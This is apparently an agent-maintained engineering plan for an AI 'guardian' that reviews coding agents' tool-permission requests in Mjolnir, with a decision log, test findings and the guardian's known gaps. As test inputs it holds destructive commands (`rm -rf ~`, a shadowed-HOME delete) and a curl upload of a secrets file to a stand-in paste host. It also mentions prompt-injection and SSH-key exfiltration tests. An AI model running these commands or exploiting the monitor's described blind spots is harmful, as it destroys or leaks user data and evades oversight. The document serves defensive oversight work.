# Review tool approvals with a Mjolnir guardian for harnesses that have none

This ExecPlan is a living document. The sections `Progress`, `Surprises & Discoveries`, `Decision Log`, and `Outcomes & Retrospective` must be kept up to date as work proceeds. It follows `.agents/PLANS.md` in this repository.

## Purpose / Big Picture

Mjolnir runs coding agents ("harnesses") such as Codex, Claude Code, Kimi Code, OpenCode, and DSH. On a raw target (a bare checkout on this machine, or an SSH machine whose `permissions = "guardian"`) Mjolnir preserves "configured approvals": the harness asks before risky actions. Codex, Claude Code, Grok Build, Muse Code, and Antigravity each ship an automatic reviewer (a "guardian") that answers those questions by judging risk and the user's authorization. Kimi Code, OpenCode, and DSH ship none, so today every tool approval they raise lands on the person as a form, and the dashboard warns "DANGER: … has no guardian approval mode".

After this change, a session of Kimi Code, OpenCode, or DSH under configured approvals has a guardian too. When the harness sends an ACP permission request (ACP is the Agent Client Protocol: JSON-RPC over the harness bridge's stdin and stdout, and `session/request_permission` is the request a harness sends before running a tool that needs consent), the Mjolnir worker reviews the exact action with Codex's guardian policy, using the same harness and the session's own model as the reviewer, and answers allow or deny on the person's behalf. A denial appears in the session transcript with the reviewer's one-sentence rationale. If the reviewer cannot reach a decision, or keeps denying within one turn, the request goes to the person as the ordinary permission form, so nothing runs without either the guardian's or the person's approval and nobody is left stuck.

To see it working: start a Kimi Code, OpenCode, or DSH session on `localhost`, ask the agent to run `ls`; it runs without a form. Ask it to run `rm -rf ~`; the transcript shows "Mjolnir guardian denied …" and the agent is refused.

## Progress

- [x] (2026-11-20 10:40Z) Read Codex's guardian source (openai/codex at 076ac78) and BrokkAi's muse-acp auto-review; read Mjolnir's ACP permission path, transcript evidence, and bridge launch.
- [x] (2026-11-20 11:05Z) Milestone 1: guardian core in `mj-worker/src/acp/guardian.rs` with the vendored policy in `mj-worker/src/acp/guardian/` and the per-turn breaker in `mj-transcript/src/turn_context.rs`.
- [x] (2026-11-20 11:20Z) Milestone 2: reviewer host in `mj-worker/src/acp/guardian/reviewer.rs`.
- [x] (2026-11-20 11:40Z) Milestone 3: wired into the permission handler in `mj-worker/src/acp/drive.rs`; review withdrawal joins `withdraw_tool_permissions`; scripted end-to-end tests in `mj-worker/src/acp/guardian_tests.rs`.
- [x] (2026-11-20 12:10Z) Milestone 4: `HarnessKind::guardian`, the dashboard's no-guardian marker, footnote and wizard warning removed, docs updated, Codex attribution in `licenses/native/OPENAI_CODEX_GUARDIAN_NOTICE.txt`.
- [x] (2026-11-20 12:50Z) Live validation on an isolated instance with real OpenCode 2.2.7 and its free model; found and fixed OpenCode never asking (see Surprises).
- [x] (2026-11-20 13:10Z) Milestone 5: clippy and the touched crates' suites; commit and push.
- [ ] Follow-up: a profile setting that names the reviewer model for Kimi Code, OpenCode, and DSH (the existing `guardian_review_model` is Codex-only).

## Surprises & Discoveries

- Observation: Codex's guardian has grown into several crates (`codex-rs/core/src/guardian`, `codex-rs/ext/guardian-reviewer`, `codex-rs/guardian-context`, `codex-rs/prompts/templates/guardian`), including an asynchronous scorer ("guardian v2/v3"). The synchronous reviewer is the part that decides an approval, and it is what this plan ports.
  Evidence: `codex-rs/core/src/guardian/decision.rs` routes each approval through `codex_guardian_reviewer::ReviewRequest::decide`; the async scorer only decides whether a later action needs the synchronous review.
- Observation: OpenCode 2.2.7 asks when no permission rule matches (`packages/core/src/permission.ts`, `evaluate` defaults to `effect: "ask"`), and its default Build agent adds no allow rules, so under configured approvals its side-effecting tools do reach the worker as ACP permission requests. Its ACP bridge offers `once`, `always`, and `reject` and drops any feedback text.
- Observation: Kimi Code runs every shell command through the client's ACP terminal (`mj-worker/src/acp/session.rs`, the comment before `ClientCapabilities::new()`), so a reviewer connection that does not advertise the terminal capability cannot run shell commands at all.
- Observation: BrokkAi's muse-acp already implements a Codex-derived auto-review for Muse (`docs/auto-review.md` in BrokkAi/muse-acp): a separate read-only host, a fresh reviewer session per review, deny on reviewer failure, a 180 second deadline because 90 seconds timed out on a slow default reasoning tier, and the reviewer pinned to low reasoning effort.

- Observation: OpenCode 2.2.7's default agent allows every tool (`packages/schema/src/agent.ts`: `{"action": "*", "resource": "*", "effect": "allow"}`, asking only before reading `.env` files), so a live OpenCode session ran an arbitrary `curl` upload without asking and the guardian saw nothing. Mjolnir's docs had said OpenCode "asks before tools according to its permission rules".
  Evidence: isolated instance `guardian-test`, OpenCode session with an empty `opencode.json`: `curl --data-binary @notes/secrets.env https://paste.example.invalid/upload` ran with no `session/request_permission`.
- Observation: Mjolnir's OpenCode `gh` approval used the action `bash`, but OpenCode 2.2.7's native rules name the shell tool's action `shell`; only its legacy `permission` object maps `bash` onto `shell` (`packages/core/src/v1/config/migrate.ts`, `normalizeAction`). The rule never matched; nobody noticed because OpenCode asked for nothing.
- Observation: two `opencode acp` processes started at the same instant on one fresh home fail ("Standalone server exited before reporting readiness"); a second process started after the first is up works. The reviewer starts lazily at the first permission request, long after the session's bridge, and a restarted bridge stops its reviewer first, so the race cannot occur.
- Observation: a request to a reviewer bridge that has died is never answered by the ACP connection; the review would have hung until its 90 second deadline. Found by the reviewer-crash test.
- Observation: when the reviewer process dies, a pending request can fail with "Incoming transport closed" before the host's task observes the exit, so a liveness flag set only by the task made the guardian treat a dead reviewer as alive and skip the retry (the crash test failed about two runs in three after merging upstream). Every observer of the death now records it in the one `gone` token, using the ACP crate's origin-based `is_incoming_transport_closed`, and the retry decision reads only that token; 18 consecutive runs passed afterwards.
- Observation: live reviews on OpenCode's free model took 2.7 to 38.6 seconds. That model allowed `HOME=/tmp/gtest/fakehome rm -rf $HOME/old-cache` as low risk, missing Codex's explicit rule to deny destructive commands with a shadowed `HOME`; it read `$HOME` as the fake home. The prompt and action it received were correct (read back from the reviewer session in OpenCode's database). The session's own agent refused a prompt-injected upload and an SSH key upload by itself.

## Decision Log

- Decision: Port Codex's synchronous guardian: its policy (`policy.md` inserted into `policy_template.md`), its prompt framing (intro, `>>> TRANSCRIPT START/END`, `>>> APPROVAL REQUEST START/END`, "Planned action JSON:"), its JSON output contract and tolerant parser, its outcome thresholds, its 90 second review deadline with up to three attempts, its rejection text, and its per-turn denial circuit breaker (3 consecutive denials or 10 of the last 50 reviews).
  Rationale: The user asked for a guardian based on Codex's actual source. These are the parts that decide an approval; Codex's prompt caching, async scoring, analytics, and conversation-history retrieval tools depend on OpenAI services Mjolnir does not have.
  Date/Author: 2026-11-20, agent.
- Decision: The reviewer runs on the same harness as the session, as a second bridge process launched with the session's own command, environment, and staged home, and uses the session's model. Each review opens a fresh ACP session on that process with no MCP servers, no client terminal and no client file system, the same execution enforcement as the session (for DSH, `permission_mode` `ask`), and every permission request it raises is refused.
  Rationale: The user asked to use "those same systems and models by default". Running the review through the harness itself works for all three harnesses, including OpenCode, which has no direct-inference path in Mjolnir. Containment is harness independent: the reviewer runs under the session's own harness configuration and every action that needs approval is refused, so it can never do anything the session's agent could not already do without review, and it has strictly fewer tools (no MCP servers, no client terminal). A second process keeps reviewer traffic out of the session's own ACP connection, transcript, and activity clocks.
  Date/Author: 2026-11-20, agent.
- Decision: A completed review that denies refuses the action (the request's one-time reject option). A review that cannot reach a decision (reviewer failed to start, protocol error, deadline passed, no parsable verdict after the follow-up) and a turn whose denials tripped the breaker both hand the request to the person as the ordinary permission form, with the reason in the form's message.
  Rationale: Codex and muse-acp deny on reviewer failure because they have no person in the loop for that request. Mjolnir does: the form is the existing safe path, nothing runs without approval, and the failure is reported visibly. When the person is away, Mjolnir's away handling already answers forms with Skip (a one-time rejection), which is Codex's fail-closed behavior. Interrupting the turn, as Codex's breaker does, would discard the turn; asking the person stops the loop just as well.
  Date/Author: 2026-11-20, agent.
- Decision: The model's outcome is clamped by Codex's own thresholds: `critical` risk always denies, and `high` risk denies unless `user_authorization` is `medium` or `high`.
  Rationale: Codex's policy states these thresholds; muse-acp enforces them in code so a model that writes "allow" beside a critical risk cannot override the policy. The default policy defines no rule that allows more than these thresholds.
  Date/Author: 2026-11-20, agent.
- Decision: The rationale is not delivered to the agent through the permission response.
  Rationale: ACP's permission response carries only the selected option; OpenCode's bridge drops anything else. The agent sees an ordinary refusal; the person sees the rationale in the transcript.
  Date/Author: 2026-11-20, agent.
- Decision: The reviewer's model is the session's model in this change. A profile setting that names another reviewer model is left for a follow-up.
  Rationale: The existing `guardian_review_model` profile setting is validated, documented, and surfaced in settings only for Codex custom providers; extending it touches profile validation, both settings surfaces, and the worker launch format. The requested default works without it.
  Date/Author: 2026-11-20, agent.

- Decision: Under configured approvals Mjolnir appends rules to OpenCode's `OPENCODE_CONFIG_CONTENT` that make every tool ask except reads and searches (with OpenCode's `.env` caution restated), planning tools, its own sub-agents, and edits inside the workspace; `external_directory` asks. The `gh` approval uses the `shell` action.
  Rationale: Without asking there is nothing to review. The exemptions mirror what Codex's sandbox lets run without its guardian (reads anywhere, writes inside the workspace). Mjolnir's document is the last one OpenCode reads, so these rules also take precedence over a person's own OpenCode allow rules; the guardian then allows what is low risk. The alternative, prepending a default to the staged `opencode.json`, would still be overridden within that document by the person's legacy `permission` rules and would rewrite their global file.
  Date/Author: 2026-11-20, agent.
- Decision: A review retries only after a change: a dead reviewer is replaced, and a reply without a verdict gets the reminder. A failure on a live reviewer ends the review and the person is asked. Whether the reviewer is alive has one owner, a cancellation token every reviewer request races.
  Rationale: Repeating an identical request to a live reviewer changes nothing (AGENTS.md: every retry needs a backoff or a state change), and a request to a dead bridge is never answered.
  Date/Author: 2026-11-20, agent.
- Decision: Guardian decisions log under the `mj_guardian` target, which the worker's default filter keeps at INFO, with outcome, risk, authorization, and duration but never the rationale or reviewer text.
  Rationale: The decision trail must be in `worker.log` to diagnose a session, as Jev's is; the reviewer's words can quote workspace content, and the transcript already carries a denial's rationale.
  Date/Author: 2026-11-20, agent.

- Decision: OpenCode is made to ask by a plugin hook (`permission.evaluate`, which runs after OpenCode's rules and after its deny check), not by rules appended last. The hook turns `allow` into `ask` unless the action is a read or search, a planning tool, `subagent`, `external_directory`, or an edit whose real path is inside a workspace root and not under `.git`, `.agents`, `.codex`, `.aws`, `.opencode`, `opencode.json(c)` or `AGENTS.md`. Tools that never consult permissions are denied by rule.
  Rationale: Appended rules win by last match, so they overrode every earlier deny (Plan, Explore, the person's). A hook after the rules can only narrow an allow. The protected names follow Codex's `PROTECTED_METADATA_PATH_NAMES` plus OpenCode's own configuration and the instruction files the reviewer trusts; real-path resolution stops symlinks from carrying edits out.
  Date/Author: 2026-11-20, agent (review round).
- Decision: The reviewer starts from a launch narrowed for it: its own supervisor spec beside the session's, whose OpenCode environment has every Mjolnir plugin replaced by the reviewer-mode hook and deny-all-but-read rules appended.
  Rationale: The session's launch carried the mailbox plugin, which drained the session's mailbox into the reviewer. A reviewer-mode deny (not ask) is a tool error OpenCode reports to the model; a rejected ask ends an OpenCode turn.
  Date/Author: 2026-11-20, agent (review round).
- Decision: Kimi Code's reviewer keeps loading the staged `mcp.json`; no Kimi-specific isolation is shipped.
  Rationale: Whether Kimi asks before MCP calls could not be verified without a Kimi login, and an untested home-mirroring workaround could break every Kimi review. The docs state the limitation.
  Date/Author: 2026-11-20, agent (review round).
- Decision: `run_bridge` owns the guardian, like the terminal registry, and stops its reviewer after the bridge's own teardown on every exit path; a reviewer start dropped mid-way stops its bridge through a drop guard.
  Rationale: Waiting for the reviewer inside the protocol driver let the session bridge exit first, which `run_bridge` reads as a crash, and a dropped start kept its bridge alive.
  Date/Author: 2026-11-20, agent (review round).
- Decision: Reviews are registered in `PendingElicitations` beside the forms; one lock decides what is outstanding, `withdraw_tool_permissions` withdraws both and marks the turn withdrawn until its prompt answers or the next prompt starts, and a tool permission request or review in a withdrawn turn is answered `cancelled`.
  Rationale: Two withdrawal mechanisms let a request that crossed the cancel be reviewed and allowed, and a hand-over to the form land on a cancelled turn; `is_empty` ignored reviews.
  Date/Author: 2026-11-20, agent (review round).
- Decision: The guardian allows only with the request's allow-once option; a verdict is the JSON object a reply ends with; a verdict reached while the person's messages changed is reviewed again once; the review deadline starts after waiting for another review to start the shared reviewer; reviewer sessions close in the background.
  Rationale: Allow-always would let later calls skip review; Codex's first-to-last-brace span relies on an output schema ACP cannot enforce; Codex discards stale verdicts; AGENTS.md keeps queue time out of a timeout.
  Date/Author: 2026-11-20, agent (review round).
- Decision: Deviations kept: the policy is the reviewer's first user message, not its system prompt (ACP has no portable system role); Antigravity is classified as having its own guardian (its Auto mode) and lost the dashboard warning; the breaker resets on any new delivered request, steering and mailbox deliveries included; a review in progress shows nothing in the UI; the `gh` pre-approval (any literal `gh` invocation) is the existing Mjolnir policy and is not narrowed here.
  Rationale: Each was weighed in review and left for a separate change if wanted.
  Date/Author: 2026-11-20, agent (review round).

## Outcomes & Retrospective

Kimi Code, OpenCode, and DSH sessions on raw targets now have a guardian: each permission request is reviewed with Codex's policy by a fresh session of the same harness on the session's model, allowed or denied without a form, and handed to the person when the review cannot decide or keeps denying. The scripted tests cover allow, deny, the policy clamp, the verdict reminder, the reviewer's own tool request being refused, the breaker, turn cancellation, and a reviewer crash. A live run on real OpenCode with its free model reviewed and allowed real shell commands end to end.

The live run also showed the limits. The guardian is only as good as the reviewing model; OpenCode's free model missed an explicit deny rule. A profile setting for a stronger reviewer model is the natural follow-up. OpenCode needed Mjolnir's rules before it asked about anything, and two pre-existing OpenCode defects surfaced (the `bash` action, and the docs naming the profile kind `opencode` where the configuration accepts `open-code`; the latter is not changed here). Kimi Code and DSH could not be run live here (no credentials); their paths are covered by the scripted harness and by the existing Kimi permission journal.

## Context and Orientation

The Mjolnir worker (`mj-worker`) runs one harness per session. It starts the harness's ACP bridge as a child process (`run_bridge` in `mj-worker/src/acp.rs`, which spawns `LaunchSpec::command` with `LaunchSpec::args`, `environment`, and `cwd`) and acts as the ACP client. `LaunchSpec` (`mj-worker/src/acp/launch.rs`) carries everything about the session's launch, including `harness: HarnessKind`, `execution_policy: ExecutionPolicy`, `turn_context`, and `startup_model()`, which returns the model the session currently runs.

`drive_bridge` in `mj-worker/src/acp/drive.rs` registers the ACP handlers. Its `RequestPermissionRequest` handler is where a harness's tool approval arrives. Today it: approves everything under the unconstrained policy; approves calls to Mjolnir's own MCP tools (`OwnedMcpApprovals`) and literal `gh` invocations (`gh_permission_response`); sends plan approvals to plan review; and otherwise builds a permission form (an elicitation) for the person through `PendingElicitations`, answering the harness with the chosen option. Helpers live in `mj-worker/src/acp/permissions.rs` (`allow_permission_response`, `permission_choices`, `is_plan_permission`).

`ExecutionPolicy::ConfiguredApprovals` is the policy for raw targets; `HarnessKind::execution_enforcement` and `resolve_execution_enforcement` (`mj-core/src/config/harness.rs`) translate it into harness controls (for DSH, the ACP setting `permission_mode` `ask`). `mj-worker/src/acp/session_config.rs` applies them to an open session (`reassert_execution_policy`, `set_session_config`). Before this work, `HarnessKind::supports_guardian_approvals` decided the dashboard's "DANGER" warning (`mj-tui/src/wizards/picker.rs`, `render.rs`); this plan replaces it with `HarnessKind::guardian()`.

The session bridge is started by `run_bridge` as the worker's ACP supervisor (`worker acp-supervisor --spec acp-supervisor.json`, see `mj-worker/src/worker_runtime/unix.rs`), which takes the harness environment from that spec file. OpenCode's harness configuration includes `OPENCODE_CONFIG_CONTENT`, the configuration document Mjolnir supplies last, built in `mj-worker/src/worker_runtime/json_gh_rules.rs`, which also registers Mjolnir's OpenCode plugins (the mailbox plugin from `mj-worker/assets/opencode-mailbox.js`).

`mj_transcript::turn_context::TurnContext` (`mj-transcript/src/turn_context.rs`) is the worker's process-local evidence about the conversation: a `TranscriptSummary` of user, assistant, and tool entries (`mj-transcript/src/summary.rs`, rendered as `<user>…</user>`, `<assistant>…</assistant>`, `<tool NAME>…</tool>` with head-and-tail excerpts), and the durable authorization history (`authorization_context()`, a `mj_core::assessment::ContextHistory` holding whole recent messages the person wrote, filtered by `mj_core::continuation::is_user_authored_message`, plus assistant replies). Mjolnir-submitted prompts (mailbox wakes, child reports) appear in the summary as user entries but are not in the authorization history.

`RuntimeEvent::Notice { message }` (`mj-core/src/acp.rs`) adds an informational line to the session transcript.

## Plan of Work

Milestone 1 creates `mj-worker/src/acp/guardian.rs` and the vendored policy files `mj-worker/src/acp/guardian/policy.md` and `mj-worker/src/acp/guardian/policy_template.md` (copied from `codex-rs/prompts/templates/guardian/` with an attribution header; the template's "Execution Environment" section is rewritten for Mjolnir: the agent runs without a sandbox and asks before risky tools; the reviewer may read files but every other tool is refused and it has no network). The module renders the reviewer prompt from three inputs: trusted user instructions (the authorization history's user messages), the recent transcript (the summary rendered within Codex's synchronous transcript budget, 20,000 message tokens plus 10,000 tool tokens, taken as about 4 bytes per token), and the planned action JSON built from the ACP request (harness, tool title, kind, raw input, diff or text content, locations, working directory, native child session). It parses the verdict with Codex's tolerant parser and output defaults, clamps the outcome by the thresholds, and renders Codex's rejection text for the transcript. It also holds the denial breaker, reset at each new prompt.

Milestone 2 adds the reviewer host. On the first review of a bridge's life the worker spawns a second process from the same `LaunchSpec`, initializes ACP with no terminal, file system, or elicitation capability, and keeps the connection. Each review opens a session in the session's working directory and directories with no MCP servers, applies the session's execution enforcement, selects the session's model (and `low` effort when the harness offers it, as Codex and muse-acp do), prompts, collects the agent message text of that session, and closes the session when the harness supports closing. Every reviewer permission request is answered with its one-time rejection, every other client request with "method not found". A review has one 90 second deadline covering every attempt; a transport failure discards the host and retries on a fresh one, and a reply without a verdict is asked once more for only the JSON, up to three attempts in all. Cancelling the session's turn cancels the review.

Milestone 3 calls the guardian from the permission handler for non-plan requests under configured approvals when `spec.harness.guardian()` is the Mjolnir guardian, after the existing owned-MCP and `gh` approvals. Allow selects `allow_permission_response`; deny selects the request's `reject_once` option and emits a notice; an undecided review or a tripped breaker continues into the existing form code with the reason prefixed to the form message. A scripted harness test drives the whole path.

Milestone 4 introduces `HarnessKind::guardian()` returning who reviews approvals under configured approvals (the harness itself for Codex, Claude Code, Grok Build, Muse Code, and Antigravity; Mjolnir for Kimi Code, OpenCode, and DSH), removes `supports_guardian_approvals` and the dashboard warning that no longer applies, and updates `docs/src/content/docs/security.md`, `targets.md`, `profiles.md`, `overview.md`, and `containers.md`.

## Concrete Steps

Work from `/workspace/a6a1d51b411116c4837bb00afbc1dd86/mjolnir` (the repository root). Workspace packages are named `brokk-mj-*`.

    cargo check -p brokk-mj-worker
    cargo test -p brokk-mj-worker guardian
    cargo clippy -p brokk-mj-worker --all-targets -- -D warnings

Run every `cargo test` outside the restricted sandbox.

## Validation and Acceptance

The scripted harness test starts the worker's ACP driver against a Python fake bridge that plays both the session's harness and the reviewer: the session requests permission for a command, the reviewer process answers with a JSON verdict. Acceptance: an allow verdict selects the allow option without a form; a deny verdict selects the reject option and records a notice naming the rationale; a reviewer that requests a tool is refused; a reviewer that never answers sends the request to the person's form after the deadline; a critical verdict marked allow is refused.

## Idempotence and Recovery

All changes are additive code and documentation; rerunning tests is safe. The reviewer process is a child of the worker and is reaped with the bridge.

## Artifacts and Notes

Codex source: https://github.com/openai/codex at commit 076ac7856b1235947f271930bd7437bae54a0dfc. Files ported: `codex-rs/prompts/templates/guardian/policy.md`, `policy_template.md`, `codex-rs/ext/guardian-reviewer/src/assessment.rs` (output contract and parser), `circuit_breaker.rs`, `lib.rs` (`MAX_REVIEW_ATTEMPTS`, `REVIEW_TIMEOUT`), `codex-rs/prompts/src/model_messages/guardian.rs` (rejection and timeout text), `codex-rs/guardian-context/src/composition.rs` and `action.rs` (prompt framing).

## Interfaces and Dependencies

In `mj-core/src/config/harness.rs`:

    pub enum GuardianReviewer { Harness, Mjolnir }
    impl HarnessKind { pub const fn guardian(self) -> GuardianReviewer }

In `mj-worker/src/acp/guardian.rs` (prompt, action, verdict) and `mj-worker/src/acp/guardian/reviewer.rs` (reviewer process):

    pub(in crate::acp) struct Guardian  // owned by run_bridge; owns the reviewer host
    impl Guardian {
        fn for_launch(spec: &LaunchSpec) -> Option<Arc<Self>>
        async fn review(&self, request: &RequestPermissionRequest, input: Option<&Value>, native_child: bool) -> GuardianDecision
        async fn shutdown(&self)
    }
    pub(super) enum GuardianDecision { Allow, Deny { rationale: String }, AskPerson { reason: String } }

The denial breaker lives in `mj_transcript::turn_context::TurnContext` (`guardian_tripped`, `record_guardian_review`), which owns turn boundaries. Outstanding permission requests, forms and reviews alike, are owned by `PendingElicitations` in `mj-worker/src/acp/operator_away.rs` (`begin_review`, `withdraw_tool_permissions`, `end_withdrawal`).

In `mj-worker/src/worker_runtime/json_gh_rules.rs`: `configure_opencode_guardian` stages the OpenCode plugin from `mj-worker/assets/opencode-guardian.js` in two modes and registers the session one; `opencode_reviewer_environment` derives a reviewer's environment from the session's.

## Revision notes

- 2026-11-20, after the first push: three independent reviews found that appending OpenCode rules last overrode Plan mode's, the read-only agents' and the person's denies; that the OpenCode reviewer inherited the session's mailbox plugin and drained its mailbox; that unreviewed in-workspace edits could reach `.git` hooks, `.opencode` agent files and `AGENTS.md`; that several OpenCode tools never consult permissions; that the reviewer bridge's lifetime was not tied to the session bridge's (a normal end looked like a crash, a cancelled start leaked a process); that forms and reviews were withdrawn by two mechanisms; that an allow could become allow-always; and that verdicts could be stale or taken from a quoted object. The Decision Log and Interfaces sections record the fixes.
- 2026-11-20, PR #1621 review: the guardian hook now treats a symbolic link whose target does not exist as leading outside the workspace and compares protected names without case; the OpenCode reviewer keeps the person's own plugins (a provider may need one to sign in) with its hook registered last; five more OpenCode tools that never consult permissions are denied (`artifact_update`, `artifact_delete`, `schedule_pause`, `schedule_resume`, `schedule_delete`); a guardian verdict is settled under the lock that withdraws turns, and a cancel marks the turn withdrawn before the agent is told, so no allow follows a cancel; a cancel while idle leaves no turn withdrawn; `/clear` names a review in progress; a verdict is reviewed again only when the person wrote a new message (by message identity), not when the history's window moves, and as often as the deadline allows; the Codex notice's two copies are kept identical by a test, and the breaker in `mj-transcript` is credited as a re-implementation, not copied text.
- 2026-11-20, second PR #1621 review: OpenCode Console's permissionless event-watch tools are denied too; the reviewer's stop owner now covers a bridge that hangs before opening ACP, so dropping its start still closes and reaps it; AFK cannot answer a tool form after withdrawal starts but before that form is removed; and an edit with no resources asks instead of passing as an in-workspace edit.
